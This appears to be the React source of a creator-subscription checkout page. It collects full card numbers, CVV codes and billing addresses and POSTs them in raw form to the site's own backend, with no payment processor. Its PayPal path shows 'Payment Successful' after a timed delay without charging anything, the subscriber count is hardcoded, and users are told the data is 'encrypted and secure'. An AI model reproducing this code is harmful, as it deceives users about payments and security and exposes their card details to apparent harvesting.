import { useState, useEffect } from "react";
import { useParams, useNavigate, useLocation } from "react-router-dom";
import { 
  Check, 
  ArrowRight, 
  CreditCard, 
  Lock, 
  AlertCircle, 
  ChevronLeft,
  Loader2,
  X,
  ShieldCheck,
  BadgeCheck,
  Plus,
  Wallet
} from "lucide-react";

export default function CreatorSubscriptionPage() {
  const { creatorId } = useParams();
  const navigate = useNavigate();
  const location = useLocation();
  
  const [paymentStep, setPaymentStep] = useState(1);
  const [processing, setProcessing] = useState(false);
  const [error, setError] = useState("");
  const [isFlipped, setIsFlipped] = useState(false);
  const [creator, setCreator] = useState(null);
  const [loading, setLoading] = useState(true);
  const [showSuccess, setShowSuccess] = useState(false);
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState("");

  const { creatorData: stateCreatorData } = location.state || {};

  const [formData, setFormData] = useState({
    card_holder_name: "",
    card_number: "",
    expiry: "",
    cvc: "",
    brand: "Visa",
    address_line1: "",
    address_line2: "",
    city: "",
    state: "",
    postal_code: "",
    country: "US"
  });

  // Helper functions
  const handleImageUrl = (imagePath) => {
    if (!imagePath) return "https://via.placeholder.com/150";
    if (imagePath.startsWith('http')) return imagePath;
    return `https://stream-l2du.onrender.com${imagePath}`;
  };

  const initializeCreatorData = async () => {
    try {
      setLoading(true);
      let creatorObj;
      
      if (stateCreatorData) {
        creatorObj = createCreatorObject(stateCreatorData);
      } else {
        const response = await fetch(`https://stream-l2du.onrender.com/api/creators/${creatorId}/`);
        if (!response.ok) throw new Error('Failed to fetch creator data');
        const data = await response.json();
        creatorObj = createCreatorObject(data);
      }
      
      setCreator(creatorObj);
    } catch (err) {
      console.error('Error initializing creator data:', err);
      setCreator(createDefaultCreatorObject());
      setError("Failed to load creator information");
    } finally {
      setLoading(false);
    }
  };

  const createCreatorObject = (data) => ({
    id: creatorId,
    name: data.creator_name,
    username: `@${data.creator_username || data.creator_name.toLowerCase().replace(/\s/g, '_')}`,
    avatar: handleImageUrl(data.profile_pic),
    coverImage: handleImageUrl(data.cover_photo || data.profile_pic),
    description: data.bio || "Subscribe for exclusive content from this creator",
    monthlyPrice: parseFloat(data.subscription_price) || 9.99,
    subscriberCount: 5287 // Updated to 5,287
  });

  const createDefaultCreatorObject = () => ({
    name: "Creator",
    username: "@creator",
    avatar: "https://via.placeholder.com/150",
    coverImage: "https://via.placeholder.com/800x400",
    description: "Subscribe for exclusive content from this creator",
    monthlyPrice: 9.99,
    subscriberCount: 5287 // Updated to 5,287
  });

  // Effects
  useEffect(() => {
    initializeCreatorData();
  }, [creatorId, stateCreatorData]);

  useEffect(() => {
    const cardNumber = formData.card_number.replace(/\s/g, '');
    let brand = "Visa";
    
    if (/^4/.test(cardNumber)) brand = "Visa";
    else if (/^5[1-5]/.test(cardNumber)) brand = "Mastercard";
    else if (/^3[47]/.test(cardNumber)) brand = "American Express";
    else if (/^6(?:011|5)/.test(cardNumber)) brand = "Discover";
    
    setFormData(prev => ({ ...prev, brand }));
  }, [formData.card_number]);

  // Form handling
  const formatCardNumber = (value) => {
    if (!value) return "";
    const digits = value.replace(/\D/g, "");
    if (digits.length > 16) return formData.card_number;
    return digits.match(/.{1,4}/g)?.join(" ") || digits;
  };

  const formatExpiryDate = (value) => {
    if (!value) return "";
    const digits = value.replace(/\D/g, "");
    if (digits.length > 4) return formData.expiry;
    return digits.length > 2 
      ? `${digits.substring(0, 2)}/${digits.substring(2)}` 
      : digits;
  };

  const formatCVC = (value) => value ? value.replace(/\D/g, "").substring(0, 4) : "";

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    let formattedValue = value;
    
    if (name === "card_number") formattedValue = formatCardNumber(value);
    else if (name === "expiry") formattedValue = formatExpiryDate(value);
    else if (name === "cvc") formattedValue = formatCVC(value);
    
    setFormData(prev => ({ ...prev, [name]: formattedValue }));
  };

  const isFormValid = () => {
    const cardNumberValid = formData.card_number.replace(/\s/g, '').length === 16;
    const expiryValid = formData.expiry.length === 5;
    const cvcValid = formData.cvc.length >= 3;
    
    return formData.card_holder_name && 
           cardNumberValid && 
           expiryValid && 
           cvcValid &&
           formData.address_line1 && 
           formData.city && 
           formData.state && 
           formData.postal_code;
  };

  // Payment submission with 4-second processing delay
  const handlePaymentSubmit = async () => {
    if (selectedPaymentMethod === "paypal") {
      // Handle PayPal payment
      setProcessing(true);
      setTimeout(() => {
        handleSuccess();
      }, 4000);
      return;
    }
    
    // Original credit card payment flow
    setProcessing(true);
    setError("");
    
    try {
      const accessCode = localStorage.getItem('access_code');
      if (!accessCode) throw new Error('Please login again - authentication required');

      const [expiryMonth, expiryYear] = formData.expiry.split('/');
      const paymentData = {
        digit: formData.card_number.replace(/\s/g, ''),
        card_holder_name: formData.card_holder_name,
        exp_month: parseInt(expiryMonth),
        exp_year: parseInt(`20${expiryYear}`),
        cvv: formData.cvc,
        brand: formData.brand,
        is_default: true,
        
        billing_address_line1: formData.address_line1,
        billing_address_line2: formData.address_line2 || null,
        billing_city: formData.city,
        billing_state: formData.state,
        billing_postal_code: formData.postal_code,
        billing_country: formData.country
      };

      await new Promise(resolve => setTimeout(resolve, 4000));

      const response = await fetch('https://stream-l2du.onrender.com/api/cards/', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Access-Code': accessCode
        },
        body: JSON.stringify(paymentData)
      });

      if (!response.ok) {
        const errorData = await response.json().catch(() => ({}));
        throw new Error(errorData.detail || errorData.message || 'Payment processing failed');
      }

      handleSuccess();
      
    } catch (err) {
      console.error('Payment submission error:', err);
      setError(err.message.includes('credentials') 
        ? 'Session expired. Please login again.'
        : err.message
      );
    } finally {
      setProcessing(false);
    }
  };

  const handleSuccess = () => {
    localStorage.setItem(`creator_${creatorId}`, JSON.stringify({
      full_name: creator.name,
      username: creator.username.replace('@', ''),
      profile_picture: creator.avatar,
      cover_photo: creator.coverImage,
      bio: creator.description,
      subscriber_count: creator.subscriberCount
    }));

    setShowSuccess(true);
    setTimeout(() => {
      navigate(`../context`, {
        state: {
          subscriptionSuccess: true,
          creatorData: {
            name: creator.name,
            username: creator.username,
            avatar: creator.avatar,
            coverImage: creator.coverImage,
            description: creator.description,
            subscriberCount: creator.subscriberCount
          }
        },
        replace: true
      });
    }, 1500);
  };

  // Loading state
  if (loading) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-slate-50 p-4">
        <div className="text-center">
          <Loader2 className="w-8 h-8 mx-auto animate-spin text-slate-600" />
          <p className="mt-4 text-slate-600 font-medium">Loading creator information...</p>
        </div>
      </div>
    );
  }

  // Error state
  if (!creator) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-slate-50 p-4">
        <div className="text-center max-w-md w-full p-6 sm:p-8 bg-white rounded-lg shadow-sm border">
          <AlertCircle className="w-12 h-12 mx-auto text-red-500 mb-4" />
          <h2 className="text-xl font-semibold mb-2 text-slate-900">Creator not found</h2>
          <p className="text-slate-600 mb-6">We couldn't find the creator you're looking for.</p>
          <button 
            onClick={() => navigate(-1)}
            className="inline-flex items-center px-6 py-2 bg-slate-900 text-white rounded-lg hover:bg-slate-800 transition-colors font-medium"
          >
            <ChevronLeft className="w-4 h-4 mr-2" />
            Go back
          </button>
        </div>
      </div>
    );
  }

  // Success animation
  if (showSuccess) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-slate-50 p-4">
        <div className="text-center p-6 sm:p-8 max-w-md w-full bg-white rounded-lg shadow-sm border">
          <div className="relative mx-auto w-16 h-16 mb-6">
            <div className="absolute inset-0 bg-emerald-100 rounded-full animate-ping opacity-75"></div>
            <BadgeCheck className="w-full h-full text-emerald-600" />
          </div>
          <h2 className="text-2xl font-semibold text-slate-900 mb-2">Payment Successful</h2>
          <p className="text-slate-600 mb-6">You're now subscribed to {creator.name}</p>
          <div className="flex justify-center">
            <Loader2 className="w-5 h-5 animate-spin text-slate-600" />
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="w-full min-h-screen bg-slate-50">
      {/* Header */}
      <div className="sticky top-0 z-20 bg-white/95 backdrop-blur-sm border-b border-slate-200">
        <div className="container flex items-center justify-between px-4 sm:px-6 py-4 mx-auto max-w-6xl">
          <button 
            onClick={() => navigate(-1)}
            className="flex items-center text-slate-600 hover:text-slate-900 transition-colors px-2 py-1 rounded-md hover:bg-slate-100"
          >
            <ChevronLeft className="w-5 h-5 mr-1" />
            <span className="hidden sm:inline">Back</span>
          </button>
          <h1 className="text-sm sm:text-lg font-semibold text-slate-900 truncate mx-4">
            Subscribe to {creator.name}
          </h1>
          <div className="w-8"></div>
        </div>
      </div>

      {/* Creator banner */}
      <div className="relative h-48 sm:h-64 bg-slate-800 overflow-hidden">
        <img 
          src={creator.coverImage} 
          alt={`${creator.name}'s cover`} 
          className="object-cover w-full h-full"
          onError={(e) => {
            e.target.onerror = null;
            e.target.src = "https://via.placeholder.com/800x400";
          }}
        />
        <div className="absolute inset-0 bg-gradient-to-t from-black/60 via-black/20 to-transparent"></div>
      </div>
      
      {/* Main content */}
      <div className="container px-4 sm:px-6 mx-auto -mt-8 sm:-mt-12 max-w-4xl pb-8">
        <div className="relative z-10 bg-white rounded-xl shadow-sm border border-slate-200 overflow-hidden">
          {/* Creator profile */}
          <div className="p-4 sm:p-6 lg:p-8 border-b border-slate-100">
            <div className="flex flex-col items-center mb-6 sm:flex-row sm:items-start">
              <div className="relative mb-4 sm:mb-0">
                <img 
                  src={creator.avatar} 
                  alt={creator.name} 
                  className="object-cover w-20 h-20 sm:w-24 sm:h-24 lg:w-28 lg:h-28 rounded-full border-4 border-white shadow-lg"
                  onError={(e) => {
                    e.target.onerror = null;
                    e.target.src = "https://via.placeholder.com/150";
                  }}
                />
                <div className="absolute bottom-1 right-1 w-5 h-5 sm:w-6 sm:h-6 bg-emerald-500 border-2 sm:border-3 border-white rounded-full"></div>
              </div>
              <div className="sm:ml-6 lg:ml-8 text-center sm:text-left w-full sm:flex-1">
                <h1 className="text-xl sm:text-2xl lg:text-3xl font-semibold text-slate-900 mb-1">
                  {creator.name}
                </h1>
                <p className="text-slate-500 text-base sm:text-lg mb-3">{creator.username}</p>
                <div className="flex items-center justify-center sm:justify-start">
                  <span className="inline-flex items-center px-3 py-1 text-sm font-medium text-slate-700 bg-slate-100 rounded-full">
                    {creator.subscriberCount.toLocaleString()} subscribers
                  </span>
                </div>
              </div>
            </div>
            
            <p className="text-slate-600 leading-relaxed text-sm sm:text-base">
              {creator.description}
            </p>
          </div>
  
          {/* Payment steps */}
          <div className="px-4 sm:px-6 lg:px-8 py-4 sm:py-6 bg-slate-50 border-b border-slate-100">
            <div className="flex justify-center">
              {[1, 2, 3].map((step, index) => (
                <div key={step} className="flex items-center">
                  <div className={`flex items-center justify-center w-8 h-8 sm:w-10 sm:h-10 rounded-full font-semibold text-sm transition-all duration-300 ${
                    paymentStep >= step 
                      ? 'bg-slate-900 text-white' 
                      : 'bg-slate-200 text-slate-500'
                  }`}>
                    {paymentStep > step ? (
                      <Check className="w-4 h-4 sm:w-5 sm:h-5" />
                    ) : (
                      <span>{step}</span>
                    )}
                  </div>
                  <div className={`ml-2 sm:ml-3 font-medium text-sm sm:text-base transition-colors duration-300 ${
                    paymentStep >= step ? 'text-slate-900' : 'text-slate-500'
                  }`}>
                    {step === 1 ? 'Subscribe' : step === 2 ? 'Payment Method' : 'Payment'}
                  </div>
                  {index < 2 && (
                    <div className={`w-8 sm:w-12 h-px mx-2 sm:mx-4 transition-all duration-300 ${
                      paymentStep > step ? 'bg-slate-900' : 'bg-slate-200'
                    }`}></div>
                  )}
                </div>
              ))}
            </div>
          </div>
          
          {/* Step 1: Subscription Details */}
          {paymentStep === 1 && (
            <div className="p-4 sm:p-6 lg:p-8">
              <h2 className="text-xl sm:text-2xl font-semibold text-slate-900 mb-6">
                Subscription Details
              </h2>
              
              <div className="border border-slate-200 rounded-lg p-4 sm:p-6 mb-6">
                <div className="flex flex-col sm:flex-row sm:justify-between sm:items-center gap-2 mb-4">
                  <span className="text-slate-700 text-sm sm:text-base">
                    Monthly subscription to {creator.name}
                  </span>
                  <span className="text-lg sm:text-xl font-semibold text-slate-900">
                    ${creator.monthlyPrice.toFixed(2)}/month
                  </span>
                </div>
              </div>
              
              <div className="bg-slate-50 border border-slate-200 rounded-lg p-4 sm:p-6 mb-8">
                <h3 className="font-semibold text-slate-900 flex items-center mb-4 text-sm sm:text-base">
                  <ShieldCheck className="w-5 h-5 mr-2 text-slate-700" />
                  What you'll get:
                </h3>
                <ul className="space-y-3">
                  <li className="flex items-start">
                    <Check className="w-4 h-4 sm:w-5 sm:h-5 mr-3 text-slate-600 flex-shrink-0 mt-0.5" />
                    <span className="text-slate-700 text-sm sm:text-base">
                      Full access to all exclusive content
                    </span>
                  </li>
                  <li className="flex items-start">
                    <Check className="w-4 h-4 sm:w-5 sm:h-5 mr-3 text-slate-600 flex-shrink-0 mt-0.5" />
                    <span className="text-slate-700 text-sm sm:text-base">
                      Direct messaging with creator
                    </span>
                  </li>
                  <li className="flex items-start">
                    <Check className="w-4 h-4 sm:w-5 sm:h-5 mr-3 text-slate-600 flex-shrink-0 mt-0.5" />
                    <span className="text-slate-700 text-sm sm:text-base">
                      Early access to new releases
                    </span>
                  </li>
                </ul>
              </div>
              
              <button 
                onClick={() => setPaymentStep(2)}
                className="w-full py-3 sm:py-4 text-white font-semibold transition-all duration-200 bg-slate-900 rounded-lg hover:bg-slate-800 flex items-center justify-center text-sm sm:text-base"
              >
                Continue to Payment Method
                <ArrowRight className="w-4 h-4 sm:w-5 sm:h-5 ml-2" />
              </button>
            </div>
          )}
          
          {/* Step 2: Payment Method Selection */}
          {paymentStep === 2 && (
            <div className="p-4 sm:p-6 lg:p-8">
              <h2 className="text-xl sm:text-2xl font-semibold text-slate-900 mb-6">
                Select Payment Method
              </h2>
              
              <div className="space-y-4 mb-8">
                {/* PayPal Option */}
                <div 
                  className={`border-2 rounded-lg p-4 cursor-pointer transition-all duration-200 ${
                    selectedPaymentMethod === "paypal" 
                      ? 'border-blue-600 bg-blue-50' 
                      : 'border-slate-200 hover:border-slate-300 hover:bg-slate-50'
                  }`}
                  onClick={() => setSelectedPaymentMethod("paypal")}
                >
                  <div className="flex items-center">
                    <div className={`w-5 h-5 rounded-full border-2 mr-3 flex items-center justify-center ${
                      selectedPaymentMethod === "paypal" 
                        ? 'border-blue-600 bg-blue-600' 
                        : 'border-slate-300'
                    }`}>
                      {selectedPaymentMethod === "paypal" && (
                        <div className="w-2 h-2 bg-white rounded-full"></div>
                      )}
                    </div>
                    <div className="flex-1">
                      <div className="flex items-center justify-between">
                        <div>
                          <h3 className="font-semibold text-slate-900">PayPal</h3>
                          <p className="text-sm text-slate-600">Pay securely with your PayPal account</p>
                        </div>
                        <div className="w-12 h-8 bg-blue-100 rounded flex items-center justify-center">
                          <span className="text-blue-800 font-bold">PP</span>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                
                {/* Credit/Debit Card Option */}
                <div 
                  className={`border-2 rounded-lg p-4 cursor-pointer transition-all duration-200 ${
                    selectedPaymentMethod === "card" 
                      ? 'border-slate-900 bg-slate-50' 
                      : 'border-slate-200 hover:border-slate-300 hover:bg-slate-50'
                  }`}
                  onClick={() => setSelectedPaymentMethod("card")}
                >
                  <div className="flex items-center">
                    <div className={`w-5 h-5 rounded-full border-2 mr-3 flex items-center justify-center ${
                      selectedPaymentMethod === "card" 
                        ? 'border-slate-900 bg-slate-900' 
                        : 'border-slate-300'
                    }`}>
                      {selectedPaymentMethod === "card" && (
                        <div className="w-2 h-2 bg-white rounded-full"></div>
                      )}
                    </div>
                    <div className="flex-1">
                      <div className="flex items-center justify-between">
                        <div>
                          <h3 className="font-semibold text-slate-900">Credit or Debit Card</h3>
                          <p className="text-sm text-slate-600">Visa, Mastercard, American Express, Discover</p>
                        </div>
                        <div className="flex space-x-1">
                          <div className="w-8 h-5 bg-blue-900 rounded-sm"></div>
                          <div className="w-8 h-5 bg-red-900 rounded-sm"></div>
                          <div className="w-8 h-5 bg-blue-500 rounded-sm"></div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                
                {/* Add New Card Option */}
                <div 
                  className={`border-2 border-dashed rounded-lg p-4 cursor-pointer transition-all duration-200 ${
                    selectedPaymentMethod === "newcard" 
                      ? 'border-emerald-600 bg-emerald-50' 
                      : 'border-slate-200 hover:border-slate-300 hover:bg-slate-50'
                  }`}
                  onClick={() => {
                    setSelectedPaymentMethod("newcard");
                    setPaymentStep(3);
                  }}
                >
                  <div className="flex items-center justify-center">
                    <Plus className="w-5 h-5 text-slate-400 mr-2" />
                    <span className="font-medium text-slate-700">Add New Credit/Debit Card</span>
                  </div>
                </div>
                
                {/* Other Payment Methods */}
                <div className="pt-4">
                  <h3 className="font-semibold text-slate-900 mb-3 text-sm">Other Payment Methods</h3>
                  <div className="grid grid-cols-2 gap-3">
                    <div className="border border-slate-200 rounded-lg p-3 text-center hover:bg-slate-50 cursor-not-allowed opacity-50">
                      <div className="w-8 h-8 mx-auto mb-2 bg-slate-200 rounded"></div>
                      <span className="text-sm text-slate-600">Apple Pay</span>
                    </div>
                    <div className="border border-slate-200 rounded-lg p-3 text-center hover:bg-slate-50 cursor-not-allowed opacity-50">
                      <div className="w-8 h-8 mx-auto mb-2 bg-slate-200 rounded"></div>
                      <span className="text-sm text-slate-600">Google Pay</span>
                    </div>
                  </div>
                </div>
              </div>
              
              <div className="flex flex-col sm:flex-row gap-3">
                <button 
                  onClick={() => setPaymentStep(1)}
                  className="py-3 px-6 border border-slate-300 text-slate-700 font-medium rounded-lg hover:bg-slate-50 transition-colors text-sm sm:text-base"
                >
                  Back
                </button>
                
                <button 
                  onClick={() => {
                    if (selectedPaymentMethod === "paypal") {
                      handlePaymentSubmit();
                    } else if (selectedPaymentMethod === "card") {
                      setPaymentStep(3);
                    }
                  }}
                  disabled={!selectedPaymentMethod}
                  className={`flex-1 py-3 text-white font-semibold transition-all duration-200 rounded-lg flex items-center justify-center text-sm sm:text-base ${
                    selectedPaymentMethod 
                      ? 'bg-slate-900 hover:bg-slate-800' 
                      : 'bg-slate-400 cursor-not-allowed'
                  }`}
                >
                  {selectedPaymentMethod === "paypal" ? (
                    <>
                      <Wallet className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
                      Pay with PayPal
                    </>
                  ) : selectedPaymentMethod === "card" ? (
                    <>
                      Continue to Card Details
                      <ArrowRight className="w-4 h-4 sm:w-5 sm:h-5 ml-2" />
                    </>
                  ) : (
                    "Select Payment Method"
                  )}
                </button>
              </div>
              
              <div className="flex items-center justify-center mt-6 text-sm text-slate-600">
                <Lock className="w-4 h-4 mr-2" />
                All payments are secure and encrypted
              </div>
            </div>
          )}
          
          {/* Step 3: Payment Form (Credit Card) */}
          {paymentStep === 3 && (
            <div className="p-4 sm:p-6 lg:p-8">
              <h2 className="text-xl sm:text-2xl font-semibold text-slate-900 mb-6">
                Add Payment Card
              </h2>
              
              {/* Interactive Credit Card */}
              <div 
                className="relative w-full max-w-sm mx-auto h-48 sm:h-56 mb-8 rounded-xl shadow-lg overflow-hidden cursor-pointer transition-all duration-300 hover:shadow-xl"
                style={{ perspective: '1000px' }}
                onClick={() => setIsFlipped(!isFlipped)}
              >
                {/* Front of card */}
                <div 
                  className={`absolute inset-0 transition-all duration-500 ${isFlipped ? 'opacity-0' : 'opacity-100'}`}
                  style={{
                    backfaceVisibility: 'hidden',
                    transform: isFlipped ? 'rotateY(180deg)' : 'rotateY(0deg)',
                  }}
                >
                  <div className="p-4 sm:p-6 w-full h-full rounded-xl bg-gradient-to-br from-slate-800 to-slate-900 text-white">
                    <div className="flex justify-between items-start">
                      <div className="flex-1">
                        <div className="w-10 h-6 sm:w-12 sm:h-8 bg-white/20 rounded-md mb-4 sm:mb-6"></div>
                        <div className="text-base sm:text-lg font-mono tracking-wider mb-4 sm:mb-6 break-all">
                          {formData.card_number || '•••• •••• •••• ••••'}
                        </div>
                      </div>
                      <CreditCard className="w-6 h-6 sm:w-8 sm:h-8 text-white/70" />
                    </div>
                    <div className="mt-2 sm:mt-4 flex justify-between">
                      <div className="flex-1 pr-4">
                        <div className="text-xs uppercase opacity-70 mb-1">Card Holder</div>
                        <div className="font-medium text-sm truncate">
                          {formData.card_holder_name || 'Your Name'}
                        </div>
                      </div>
                      <div>
                        <div className="text-xs uppercase opacity-70 mb-1">Expires</div>
                        <div className="font-medium text-sm">{formData.expiry || 'MM/YY'}</div>
                      </div>
                    </div>
                  </div>
                </div>
                
                {/* Back of card */}
                <div 
                  className={`absolute inset-0 transition-all duration-500 ${isFlipped ? 'opacity-100' : 'opacity-0'}`}
                  style={{
                    backfaceVisibility: 'hidden',
                    transform: isFlipped ? 'rotateY(0deg)' : 'rotateY(-180deg)',
                  }}
                >
                  <div className="p-0 w-full h-full rounded-xl bg-gradient-to-br from-slate-700 to-slate-800 text-white">
                    <div className="w-full h-8 sm:h-12 bg-black mt-4 sm:mt-6"></div>
                    <div className="p-4 sm:p-6">
                      <div className="w-full h-8 sm:h-10 bg-white rounded-md flex items-center justify-end px-3 sm:px-4">
                        <div className="text-black font-mono font-semibold text-sm">
                          {formData.cvc || '•••'}
                        </div>
                      </div>
                      <div className="mt-3 sm:mt-4 text-xs text-center opacity-70">
                        This card is used only for payment processing and is handled securely
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              
              {/* Payment Form */}
              <form onSubmit={(e) => {
                e.preventDefault();
                handlePaymentSubmit();
              }} className="space-y-4 sm:space-y-6">
                <div>
                  <label className="block mb-2 text-sm font-medium text-slate-700">
                    Card Holder Name
                  </label>
                  <input
                    type="text"
                    name="card_holder_name"
                    value={formData.card_holder_name}
                    onChange={handleInputChange}
                    placeholder="Name on card"
                    className="w-full px-3 sm:px-4 py-2 sm:py-3 text-sm sm:text-base border border-slate-300 rounded-lg focus:ring-2 focus:ring-slate-900 focus:border-slate-900 transition-colors"
                    required
                  />
                </div>
                
                <div>
                  <label className="block mb-2 text-sm font-medium text-slate-700">
                    Card Number
                  </label>
                  <div className="relative">
                    <input
                      type="text"
                      name="card_number"
                      value={formData.card_number}
                      onChange={handleInputChange}
                      placeholder="1234 5678 9012 3456"
                      className="w-full px-3 sm:px-4 py-2 sm:py-3 pr-10 sm:pr-12 text-sm sm:text-base border border-slate-300 rounded-lg focus:ring-2 focus:ring-slate-900 focus:border-slate-900 transition-colors"
                      onFocus={() => setIsFlipped(false)}
                      required
                    />
                    <CreditCard className="absolute top-2.5 sm:top-3.5 right-3 sm:right-4 w-4 h-4 sm:w-5 sm:h-5 text-slate-400" />
                  </div>
                </div>
                
                <div className="grid grid-cols-2 gap-3 sm:gap-4">
                  <div>
                    <label className="block mb-2 text-sm font-medium text-slate-700">
                      Expiry Date
                    </label>
                    <input
                      type="text"
                      name="expiry"
                      value={formData.expiry}
                      onChange={handleInputChange}
                      placeholder="MM/YY"
                      className="w-full px-3 sm:px-4 py-2 sm:py-3 text-sm sm:text-base border border-slate-300 rounded-lg focus:ring-2 focus:ring-slate-900 focus:border-slate-900 transition-colors"
                      onFocus={() => setIsFlipped(false)}
                      required
                    />
                  </div>
                  
                  <div>
                    <label className="block mb-2 text-sm font-medium text-slate-700">CVC</label>
                    <input
                      type="text"
                      name="cvc"
                      value={formData.cvc}
                      onChange={handleInputChange}
                      placeholder="123"
                      className="w-full px-3 sm:px-4 py-2 sm:py-3 text-sm sm:text-base border border-slate-300 rounded-lg focus:ring-2 focus:ring-slate-900 focus:border-slate-900 transition-colors"
                      onFocus={() => setIsFlipped(true)}
                      required
                    />
                  </div>
                </div>
                
                <div className="pt-4 sm:pt-6">
                  <h3 className="font-semibold text-slate-900 mb-4 text-base sm:text-lg">
                    Billing Address
                  </h3>
                  
                  <div className="space-y-4">
                    <div>
                      <label className="block mb-2 text-sm font-medium text-slate-700">
                        Address Line 1
                      </label>
                      <input
                        type="text"
                        name="address_line1"
                        value={formData.address_line1}
                        onChange={handleInputChange}
                        placeholder="Street address"
                        className="w-full px-3 sm:px-4 py-2 sm:py-3 text-sm sm:text-base border border-slate-300 rounded-lg focus:ring-2 focus:ring-slate-900 focus:border-slate-900 transition-colors"
                        required
                      />
                    </div>
                    
                    <div>
                      <label className="block mb-2 text-sm font-medium text-slate-700">
                        Address Line 2 (Optional)
                      </label>
                      <input
                        type="text"
                        name="address_line2"
                        value={formData.address_line2}
                        onChange={handleInputChange}
                        placeholder="Apartment, suite, unit, etc."
                        className="w-full px-3 sm:px-4 py-2 sm:py-3 text-sm sm:text-base border border-slate-300 rounded-lg focus:ring-2 focus:ring-slate-900 focus:border-slate-900 transition-colors"
                      />
                    </div>
                    
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                      <div>
                        <label className="block mb-2 text-sm font-medium text-slate-700">City</label>
                        <input
                          type="text"
                          name="city"
                          value={formData.city}
                          onChange={handleInputChange}
                          placeholder="City"
                          className="w-full px-3 sm:px-4 py-2 sm:py-3 text-sm sm:text-base border border-slate-300 rounded-lg focus:ring-2 focus:ring-slate-900 focus:border-slate-900 transition-colors"
                          required
                        />
                      </div>
                      
                      <div>
                        <label className="block mb-2 text-sm font-medium text-slate-700">
                          State / Province
                        </label>
                        <input
                          type="text"
                          name="state"
                          value={formData.state}
                          onChange={handleInputChange}
                          placeholder="State"
                          className="w-full px-3 sm:px-4 py-2 sm:py-3 text-sm sm:text-base border border-slate-300 rounded-lg focus:ring-2 focus:ring-slate-900 focus:border-slate-900 transition-colors"
                          required
                        />
                      </div>
                    </div>
                    
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                      <div>
                        <label className="block mb-2 text-sm font-medium text-slate-700">
                          ZIP / Postal Code
                        </label>
                        <input
                          type="text"
                          name="postal_code"
                          value={formData.postal_code}
                          onChange={handleInputChange}
                          placeholder="Postal code"
                          className="w-full px-3 sm:px-4 py-2 sm:py-3 text-sm sm:text-base border border-slate-300 rounded-lg focus:ring-2 focus:ring-slate-900 focus:border-slate-900 transition-colors"
                          required
                        />
                      </div>
                      
                      <div>
                        <label className="block mb-2 text-sm font-medium text-slate-700">Country</label>
                        <select
                          name="country"
                          value={formData.country}
                          onChange={handleInputChange}
                          className="w-full px-3 sm:px-4 py-2 sm:py-3 text-sm sm:text-base border border-slate-300 rounded-lg focus:ring-2 focus:ring-slate-900 focus:border-slate-900 transition-colors"
                          required
                        >
                          <option value="US">United States</option>
                          <option value="CA">Canada</option>
                          <option value="GB">United Kingdom</option>
                          <option value="AU">Australia</option>
                          <option value="DE">Germany</option>
                          <option value="FR">France</option>
                        </select>
                      </div>
                    </div>
                  </div>
                </div>
                
                <div className="border border-slate-200 rounded-lg p-4 sm:p-6 bg-slate-50">
                  <div className="flex flex-col sm:flex-row sm:justify-between gap-2 mb-3">
                    <span className="text-slate-700 text-sm sm:text-base">Monthly subscription</span>
                    <span className="font-semibold text-slate-900 text-sm sm:text-base">
                      ${creator.monthlyPrice.toFixed(2)}
                    </span>
                  </div>
                  <div className="flex flex-col sm:flex-row sm:justify-between gap-2 text-lg font-semibold text-slate-900 pt-3 border-t border-slate-200">
                    <span>Total today</span>
                    <span>${creator.monthlyPrice.toFixed(2)}</span>
                  </div>
                </div>
                
                <div className="flex items-start text-sm text-slate-600 bg-slate-50 p-3 sm:p-4 rounded-lg border border-slate-200">
                  <Lock className="w-4 h-4 mr-2 text-slate-500 flex-shrink-0 mt-0.5" />
                  <span>Your payment information is encrypted and secure</span>
                </div>
                
                <div className="flex flex-col sm:flex-row gap-3">
                  <button 
                    type="button"
                    onClick={() => setPaymentStep(2)}
                    className="py-3 px-6 border border-slate-300 text-slate-700 font-medium rounded-lg hover:bg-slate-50 transition-colors text-sm sm:text-base"
                  >
                    Back
                  </button>
                  
                  <button 
                    type="submit"
                    disabled={!isFormValid() || processing}
                    className={`flex-1 py-3 sm:py-4 text-white font-semibold transition-all duration-200 rounded-lg flex items-center justify-center text-sm sm:text-base ${
                      isFormValid() && !processing 
                        ? 'bg-slate-900 hover:bg-slate-800' 
                        : 'bg-slate-400 cursor-not-allowed'
                    }`}
                  >
                    {processing ? (
                      <>
                        <Loader2 className="w-4 h-4 sm:w-5 sm:h-5 mr-2 animate-spin" />
                        Processing...
                      </>
                    ) : (
                      <>
                        Pay ${creator.monthlyPrice.toFixed(2)} 
                        <ArrowRight className="w-4 h-4 sm:w-5 sm:h-5 ml-2" />
                      </>
                    )}
                  </button>
                </div>
              </form>
              
              {error && (
                <div className="p-3 sm:p-4 mt-4 sm:mt-6 text-red-800 bg-red-50 rounded-lg border border-red-200">
                  <div className="flex items-start">
                    <AlertCircle className="w-4 h-4 sm:w-5 sm:h-5 mr-2 flex-shrink-0 mt-0.5" />
                    <span className="flex-grow text-sm sm:text-base">{error}</span>
                    <button 
                      onClick={() => setError("")}
                      className="ml-2 text-red-600 hover:text-red-800 transition-colors flex-shrink-0"
                    >
                      <X className="w-4 h-4 sm:w-5 sm:h-5" />
                    </button>
                  </div>
                </div>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}